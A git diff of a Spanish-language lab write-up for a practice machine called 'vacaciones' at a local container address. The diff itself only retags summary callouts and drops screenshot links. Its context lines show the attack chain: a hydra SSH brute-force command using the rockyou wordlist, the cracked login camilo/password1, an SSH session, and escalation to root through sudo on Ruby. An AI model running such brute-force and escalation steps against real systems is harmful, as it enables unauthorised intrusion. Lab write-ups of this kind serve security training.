@@ -8,7 +8,7 @@
 
 ## 📌 Resumen Ejecutivo
 
-> [!summary]
+> [!NOTE]
 > Compromiso total del sistema (acceso root) mediante una cadena de vulnerabilidades: exposición de información sensible en comentarios HTML, contraseñas débiles, credenciales almacenadas en texto plano, y configuración insegura de privilegios `sudo`.
 
 ---
@@ -58,8 +58,6 @@ hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
 ```
 Credenciales obtenidas: `camilo` / `password1`
 
-![nmap_vacaciones 1](anexos/nmap_vacaciones 1.png)
-*Escaneo de puertos y análisis del servicio web*
 
 ```bash
 ssh camilo@172.17.0.2
@@ -67,8 +65,6 @@ whoami
 # camilo
 ```
 
-![hydra_vacaciones](anexos/hydra_vacaciones.png)
-*Ataque exitoso de fuerza bruta contra SSH*
 
 **Impacto:** Acceso inicial al sistema.
 
@@ -123,8 +119,6 @@ whoami
 # root
 ```
 
-![root_vacaciones](anexos/root_vacaciones.png)
-*Obtención de shell como root mediante Ruby*
 
 **Impacto:** Compromiso total del sistema.
 
@@ -153,5 +147,5 @@ exposición de credenciales en correo → movimiento lateral (juan) → sudo rub
 
 ## 🧾 Conclusión
 
-> [!summary]
+> [!NOTE]
 > El sistema presenta múltiples fallos críticos encadenados que permiten su compromiso total. Este laboratorio demuestra cómo errores básicos de configuración pueden derivar en una intrusión completa.
